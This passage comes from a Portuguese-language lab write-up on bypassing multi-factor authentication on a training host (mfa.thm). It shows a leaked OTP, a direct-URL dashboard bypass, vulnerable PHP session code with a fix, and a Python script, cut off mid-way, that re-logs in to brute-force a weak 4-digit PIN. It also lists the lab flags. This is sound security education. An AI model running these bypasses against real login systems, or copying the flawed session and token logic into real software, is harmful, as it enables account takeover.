+<p>O token OTP é vazado na resposta HTTP, com isso conseguimos acessar a aplicação.</p>
+<p><img src="/assets/img/posts/2025/02/MFA/flag-lab1.png" alt="Flag lab1"  loading="lazy" /></p>
+<p><strong>What is the flag in the dashboard?</strong><br>
+Resposta:<code>904c8ac84e44f0ba942e9e11ee7037b8</code></p>
+<h2 data-hextra-search-id="codificação-insegura---prática">Codificação Insegura - Prática<span class="hx:absolute hx:-mt-20" id="codificação-insegura---prática"></span>
+    <a href="#codifica%c3%a7%c3%a3o-insegura---pr%c3%a1tica" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><h3 data-hextra-search-id="falha-lógica-ou-codificação-insegura">Falha lógica ou codificação insegura?<span class="hx:absolute hx:-mt-20" id="falha-lógica-ou-codificação-insegura"></span>
+    <a href="#falha-l%c3%b3gica-ou-codifica%c3%a7%c3%a3o-insegura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Em alguns aplicativos, lógica falha ou práticas de codificação inseguras podem levar a uma situação em que partes críticas do aplicativo (por exemplo, o painel) podem ser acessadas sem concluir totalmente o processo de autenticação. Especificamente, um invasor pode ser capaz de ignorar o mecanismo 2FA completamente e obter acesso ao painel ou outras áreas sensíveis sem inserir o OTP (One-Time Password). Isso geralmente ocorre devido ao gerenciamento de sessão inadequado, verificações de controle de acesso deficientes ou lógica implementada incorretamente que não consegue impor o requisito 2FA.</p>
+<h3 data-hextra-search-id="exploração-1">Exploração<span class="hx:absolute hx:-mt-20" id="exploração-1"></span>
+    <a href="#explora%c3%a7%c3%a3o-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Para autenticamos na aplicação usaremos as mesmas credenciais do exercício anterior.
+Laboratório:<code>http://mfa.thm/labs/second/</code></p>
+<p><img src="/assets/img/posts/2025/02/MFA/verification-otp-lab2.png" alt="OTP lab2"  loading="lazy" /></p>
+<p>Após informar as credenciais, somos redirecionado para a verificação de OTP.
+Porém, se alterarmos nossa URL para <code>dashboard</code> conseguimos <em>bypassed</em> a verificação de segurança, dessa forma não precisamos informar o token.
+Exemplo: <code>http://mfa.thm/labs/second/dashboard</code></p>
+<p><img src="/assets/img/posts/2025/02/MFA/flag-lab2.png" alt="Flag lab2"  loading="lazy" /></p>
+<h3 data-hextra-search-id="se-profundando-no-código">Se profundando no código<span class="hx:absolute hx:-mt-20" id="se-profundando-no-código"></span>
+    <a href="#se-profundando-no-c%c3%b3digo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># Function that verifies the submitted 2FA token
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verify_2fa_code</span>($code) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>]))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $code <span style="color:#f92672">===</span> $_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function called in the /mfa page
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">verify_2fa_code</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>])) { <span style="color:#75715e">#If successful, the user will be redirected to the dashboard.
+</span></span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; <span style="color:#75715e"># Session that is used to check if the user completed the 2FA
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">ROOT_DIR</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/dashboard&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>No exemplo acima o usuário só pode ser redirecionado para a página <code>dashboard</code>após informar o código correto do 2FA.</p>
+<p>No exemplo abaixo, não é feito as devidas verificações, após o usuário autenticar na aplicação com <code>e-mail</code>e <code>senha</code>, já possível acessar a <code>dashboard</code> sem o 2FA.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">authenticate</span>($email, $password){
+</span></span><span style="display:flex;"><span>  $pdo <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_db_connection</span>();
+</span></span><span style="display:flex;"><span>  $stmt <span style="color:#f92672">=</span> $pdo<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT `password` FROM users WHERE email = :email&#34;</span>);
+</span></span><span style="display:flex;"><span>  $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>([<span style="color:#e6db74">&#39;email&#39;</span> <span style="color:#f92672">=&gt;</span> $email]);
+</span></span><span style="display:flex;"><span>  $user <span style="color:#f92672">=</span> $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">PDO</span><span style="color:#f92672">::</span><span style="color:#a6e22e">FETCH_ASSOC</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> $user <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password_verify</span>($password, $user[<span style="color:#e6db74">&#39;password&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticate</span>($email, $password)) {
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; <span style="color:#75715e"># This flag should only be issued after the MFA completion
+</span></span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">ROOT_DIR</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/mfa&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Para remediar essa vulnerabilidade, o cookie ou sessão que é usado em verificações de autenticação deve ser dividido em duas partes.
+A primeira parte é a que define a sessão após a verificação bem-sucedida do nome de usuário e senha; o único propósito desta sessão é enviar um token 2FA.
+A segunda sessão deve ser somente após o OTP ser validado.</p>
+<p>Exemplo de código</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Parte 1: Sessão para verificar o nome de usuário e a senha
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>$_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;authenticated_user&#39;</span>; <span style="color:#75715e">// Sessão após a verificação bem-sucedida do nome de usuário e senha
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;auth_session&#39;</span>, <span style="color:#a6e22e">session_id</span>(), <span style="color:#a6e22e">time</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">3600</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;example.com&#39;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Verificação 2FA
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">verify_2fa_code</span>($_POST[<span style="color:#e6db74">&#39;2fa_code&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Parte 2: Sessão após a validação do OTP
+</span></span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;mfa&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mfa_validated&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;mfa_session&#39;</span>, <span style="color:#a6e22e">session_id</span>(), <span style="color:#a6e22e">time</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">3600</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;example.com&#39;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">ROOT_DIR</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/dashboard&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Token 2FA inválido.&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><strong>What is the flag in the dashboard?</strong><br>
+Resposta:<code>87880e9d27001affdff90989f351c46</code></p>
+<h2 data-hextra-search-id="vencendo-o-recurso-de-logout-automático">Vencendo o recurso de logout automático<span class="hx:absolute hx:-mt-20" id="vencendo-o-recurso-de-logout-automático"></span>
+    <a href="#vencendo-o-recurso-de-logout-autom%c3%a1tico" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Em alguns aplicativos, falhar no desafio 2FA pode fazer com que o aplicativo reverta o usuário de volta para a primeira parte do processo de autenticação (ou seja, o login inicial com nome de usuário e senha). Esse comportamento geralmente ocorre devido a mecanismos de segurança projetados para evitar ataques de força bruta na parte 2FA do aplicativo. O aplicativo pode forçar o usuário a se autenticar novamente para garantir que a pessoa que tenta fazer login seja de fato o usuário legítimo e não um invasor tentando adivinhar o OTP.</p>
+<h3 data-hextra-search-id="razões-comuns-para-esse-comportamento">Razões comuns para esse comportamento<span class="hx:absolute hx:-mt-20" id="razões-comuns-para-esse-comportamento"></span>
+    <a href="#raz%c3%b5es-comuns-para-esse-comportamento" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><h4 data-hextra-search-id="invalidação-de-sessão">Invalidação de Sessão<span class="hx:absolute hx:-mt-20" id="invalidação-de-sessão"></span>
+    <a href="#invalida%c3%a7%c3%a3o-de-sess%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Ao falhar no desafio 2FA, o aplicativo pode invalidar a sessão do usuário como medida de segurança, forçando o usuário a iniciar o processo de autenticação do zero.</p>
+<h4 data-hextra-search-id="políticas-de-limitação-de-taxa-e-bloqueio">Políticas de limitação de taxa e bloqueio<span class="hx:absolute hx:-mt-20" id="políticas-de-limitação-de-taxa-e-bloqueio"></span>
+    <a href="#pol%c3%adticas-de-limita%c3%a7%c3%a3o-de-taxa-e-bloqueio" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Para evitar que invasores tentem repetidamente ignorar a 2FA, o aplicativo pode ter mecanismos de limitação de taxa ou bloqueio que são acionados após um número definido de tentativas malsucedidas, revertendo o usuário para a etapa inicial de login.</p>
+<h4 data-hextra-search-id="redirecionamento-orientado-à-segurança">Redirecionamento orientado à segurança<span class="hx:absolute hx:-mt-20" id="redirecionamento-orientado-à-segurança"></span>
+    <a href="#redirecionamento-orientado-%c3%a0-seguran%c3%a7a" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Alguns aplicativos são projetados para redirecionar os usuários de volta à página de login após várias tentativas malsucedidas de 2FA como uma medida de segurança adicional, garantindo que as credenciais do usuário sejam revalidadas antes de permitir outra tentativa de 2FA.</p>
+<h3 data-hextra-search-id="automatização-é-a-chave">Automatização é a chave<span class="hx:absolute hx:-mt-20" id="automatização-é-a-chave"></span>
+    <a href="#automatiza%c3%a7%c3%a3o-%c3%a9-a-chave" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><h4 data-hextra-search-id="velocidade">Velocidade<span class="hx:absolute hx:-mt-20" id="velocidade"></span>
+    <a href="#velocidade" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Fazer login manualmente toda vez que você é desconectado é lento e tedioso. A automação pode fazer isso por você muito mais rápido.</p>
+<h4 data-hextra-search-id="consistência">Consistência<span class="hx:absolute hx:-mt-20" id="consistência"></span>
+    <a href="#consist%c3%aancia" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>A automação evita erros que podem acontecer se você estiver fazendo as mesmas ações repetitivas várias vezes. É confiável.</p>
+<h4 data-hextra-search-id="recuperando-se-de-logouts">Recuperando-se de logouts<span class="hx:absolute hx:-mt-20" id="recuperando-se-de-logouts"></span>
+    <a href="#recuperando-se-de-logouts" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Se o aplicativo fizer o logout após algumas tentativas malsucedidas, o script pode efetuar login novamente automaticamente e continuar tentando. Isso evita o incômodo de fazer isso manualmente todas as vezes.</p>
+<h3 data-hextra-search-id="exploração-2">Exploração<span class="hx:absolute hx:-mt-20" id="exploração-2"></span>
+    <a href="#explora%c3%a7%c3%a3o-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>A aplicação efetua o logout automaticamente do usuário, se ele informar o token 2FA incorreto, essa aplicação gera 4 dígitos (PIN) toda vez que o usuário realiza o login.<br>
+Laboratório:<code>http://mfa.thm/labs/third</code></p>
+<p>Código que gera o PIN:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateToken</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    $token <span style="color:#f92672">=</span> <span style="color:#a6e22e">strval</span>(<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1250</span>, <span style="color:#ae81ff">1350</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">=</span> $token;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;success&#39;</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Vamos utilizar o script fornecido em aula, para adivinhar o PIN correto.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the URLs for the login, 2FA process, and dashboard</span>
+</span></span><span style="display:flex;"><span>login_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://mfa.thm/labs/third/&#39;</span>
+</span></span><span style="display:flex;"><span>otp_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://mfa.thm/labs/third/mfa&#39;</span>
+</span></span><span style="display:flex;"><span>dashboard_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://mfa.thm/labs/third/dashboard&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define login credentials</span>
+</span></span><span style="display:flex;"><span>credentials <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#e6db74">&#39;thm@mail.thm&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;test123&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the headers to mimic a real browser</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://mfa.thm&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://mfa.thm/labs/third/mfa&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to check if the response contains the login page</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_login_successful</span>(response):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;User Verification&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text <span style="color:#f92672">and</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to handle the login process</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(session):
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(login_url, data<span style="color:#f92672">=</span>credentials, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to handle the 2FA process</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit_otp</span>(session, otp):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Split the OTP into individual digits</span>
+</span></span><span style="display:flex;"><span>    otp_data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;code-1&#39;</span>: otp[<span style="color:#ae81ff">0</span>],
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;code-2&#39;</span>: otp[<span style="color:#ae81ff">1</span>],
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;code-3&#39;</span>: otp[<span style="color:#ae81ff">2</span>],
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;code-4&#39;</span>: otp[<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(otp_url, data<span style="color:#f92672">=</span>otp_data, headers<span style="color:#f92672">=</span>headers, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)  <span style="color:#75715e"># Disable auto redirects</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;DEBUG: OTP submission response status code: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to check if the response contains the login page</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_login_page</span>(response):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Sign in to your account&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;Login&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to attempt login and submit the hardcoded OTP until success</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_until_success</span>():
+</span></span><span style="display:flex;"><span>    otp_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1337&#39;</span>  <span style="color:#75715e"># Hardcoded OTP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:  <span style="color:#75715e"># Keep trying until success</span>
+</span></span><span style="display:flex;"><span>        session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()  <span style="color:#75715e"># Create a new session object for each attempt</span>
+</span></span><span style="display:flex;"><span>        login_response <span style="color:#f92672">=</span> login(session)  <span style="color:#75715e"># Log in before each OTP attempt</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_login_successful(login_response):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Logged in successfully.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Failed to log in.&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Trying OTP: </span><span style="color:#e6db74">{</span>otp_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> submit_otp(session, otp_str)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if the response is the login page (unsuccessful OTP)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_login_page(response):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Unsuccessful OTP attempt, redirected to login page. OTP: </span><span style="color:#e6db74">{</span>otp_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>  <span style="color:#75715e"># Retry login and OTP submission</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if the response is a redirect (status code 302)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
